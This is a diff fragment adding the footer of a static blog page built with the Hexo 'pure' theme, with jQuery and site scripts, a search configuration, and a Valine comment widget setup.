+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
